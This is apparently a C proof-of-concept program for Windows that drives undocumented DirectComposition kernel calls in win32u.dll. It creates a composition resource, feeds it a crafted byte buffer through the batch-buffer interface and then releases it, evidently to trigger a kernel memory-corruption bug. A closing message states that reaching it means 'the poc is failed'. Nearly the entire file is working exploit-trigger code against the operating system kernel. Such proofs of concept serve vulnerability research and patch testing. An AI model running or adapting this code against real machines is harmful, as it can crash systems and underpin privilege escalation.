#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <winternl.h>
#include <strsafe.h>

//#pragma comment(lib, "win32u.lib")

enum DCPROCESSCOMMANDID
{
	nCmdProcessCommandBufferIterator,
	nCmdCreateResource,
	nCmdOpenSharedResource,
	nCmdReleaseResource,
	nCmdGetAnimationTime,
	nCmdCapturePointer,
	nCmdOpenSharedResourceHandle,
	nCmdSetResourceCallbackId,
	nCmdSetResourceIntegerProperty,
	nCmdSetResourceFloatProperty,
	nCmdSetResourceHandleProperty,
	nCmdSetResourceBufferProperty,
	nCmdSetResourceReferenceProperty,
	nCmdSetResourceReferenceArrayProperty,
	nCmdSetResourceAnimationProperty,
	nCmdSetResourceDeletedNotificationTag,
	nCmdAddVisualChild,
	nCmdRedirectMouseToHwnd,
	nCmdSetVisualInputSink,
	nCmdRemoveVisualChild
};

typedef
NTSTATUS
(WINAPI *NtDCompositionCreateChannel_t)(
OUT PHANDLE pArgChannelHandle,
IN OUT PSIZE_T pArgSectionSize,
OUT PVOID* pArgSectionBaseMapInProcess
);

typedef
NTSTATUS
(WINAPI *NtDCompositionProcessChannelBatchBuffer_t)(
IN HANDLE hChannel,
IN DWORD dwArgStart,
OUT PDWORD pOutArg1,
OUT PDWORD pOutArg2);


typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;
#define MAX_LOG_MESSAGE 1024

BOOL LogMessage(LEVEL Level, LPCTSTR Format, ...)
{
	TCHAR Buffer[MAX_LOG_MESSAGE] = { 0 };
	va_list Args;

	va_start(Args, Format);
	StringCchVPrintf(Buffer, MAX_LOG_MESSAGE, Format, Args);
	va_end(Args);

	switch (Level) {
	case L_DEBUG: _ftprintf(stdout, TEXT("[?] %s\n"), Buffer); break;
	case L_INFO:  _ftprintf(stdout, TEXT("[+] %s\n"), Buffer); break;
	case L_WARN:  _ftprintf(stderr, TEXT("[*] %s\n"), Buffer); break;
	case L_ERROR: _ftprintf(stderr, TEXT("[!] %s\n"), Buffer); break;
	}

	fflush(stdout);
	fflush(stderr);

	return TRUE;
}

int main(int argc, TCHAR* argv[])
{
	HANDLE hChannel;
	NTSTATUS ntStatus;
	SIZE_T SectionSize = 0x4000;
	PVOID pMappedAddress = NULL;
	DWORD dwArg1, dwArg2;
	HANDLE hResource = (HANDLE)1;
	HANDLE _H_WIN32U = NULL;//win32u.dll handle
	NtDCompositionCreateChannel_t NtDCompositionCreateChannel;
	NtDCompositionProcessChannelBatchBuffer_t NtDCompositionProcessChannelBatchBuffer;
	//
	// convert to gui thread
	//

	LoadLibrary(TEXT("user32"));
	_H_WIN32U = LoadLibrary(TEXT("win32u.dll"));
	NtDCompositionCreateChannel = (NtDCompositionCreateChannel_t)GetProcAddress(_H_WIN32U, "NtDCompositionCreateChannel");
	NtDCompositionProcessChannelBatchBuffer = (NtDCompositionProcessChannelBatchBuffer_t)GetProcAddress(_H_WIN32U, "NtDCompositionProcessChannelBatchBuffer");

	//
	// create a new channel
	//

	ntStatus = NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);
	if (!NT_SUCCESS(ntStatus)) {
		LogMessage(L_ERROR, TEXT("Create channel error code:0x%08x"), ntStatus);
		exit(-1);
	}

	LogMessage(L_INFO, TEXT("Create channel1 ok, channel=0x%x"), hChannel);

	//
	// create a new resource with type
	//

	*(DWORD*)(pMappedAddress) = nCmdCreateResource;
	*(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)hResource;
	*(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x69;
	*(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;

	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
	if (!NT_SUCCESS(ntStatus)) {
		LogMessage(L_ERROR, TEXT("Create resource error code:0x%08x"), ntStatus);
		exit(-1);
	}


	//
	// set argument of NtDCompositionProcessChannelBatchBuffer
	//

	UCHAR szBuff[] = { 0x50, 0x64, 0x1d, 0xa1, 0x3a, 0xc0, 0x5f, 0x0e, 0x06, 0x26, 0x6e, 0x8b, 0xb7, 0xbc, 0x83, 0xe5,
		0x31, 0xa0, 0x20, 0x3f, 0x87, 0x31, 0x5f, 0xe8, 0x50, 0xe3, 0x42, 0x30, 0xed, 0x91, 0x04, 0x2d,
		0xe5, 0x47, 0x68, 0x15, 0xad, 0x18, 0x0a, 0x8b, 0x79, 0x67, 0x2a, 0xec, 0x8e, 0x41, 0x07, 0xa3,
		0x94, 0x23, 0x24, 0x75, 0x60, 0x4f, 0x1c, 0xd5, 0xc6, 0x9c, 0x74, 0x33, 0xef, 0xc5, 0x68, 0x4a,
		0xa2, 0xbb, 0xbe, 0x70, 0x15, 0xef, 0x14, 0x69, 0x3e, 0xab, 0xac, 0x36 };

	*(DWORD*)pMappedAddress = nCmdSetResourceBufferProperty;
	*(HANDLE*)((PUCHAR)pMappedAddress + 4) = hResource;
	*(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;
	*(DWORD*)((PUCHAR)pMappedAddress + 0xc) = sizeof(szBuff);
	CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, sizeof(szBuff));


	//
	// call the function
	//

	LogMessage(L_INFO, TEXT("NtDCompositionSetResourceBufferProperty(0x%x, 0x%x, 0x%x, buf, 0x%x)"), hChannel,
		hResource, 1, sizeof(szBuff));
	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + sizeof(szBuff), &dwArg1, &dwArg2);

	//
	// release resource
	//


	LogMessage(L_INFO, TEXT("Release resource 0x%x"), hResource);
	*(DWORD*)(pMappedAddress) = nCmdReleaseResource;
	*(HANDLE*)((PUCHAR)pMappedAddress + 4) = hResource;
	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);

	LogMessage(L_ERROR, TEXT("!!if go here, the poc is failed, try again!!"));

	return 0;
}
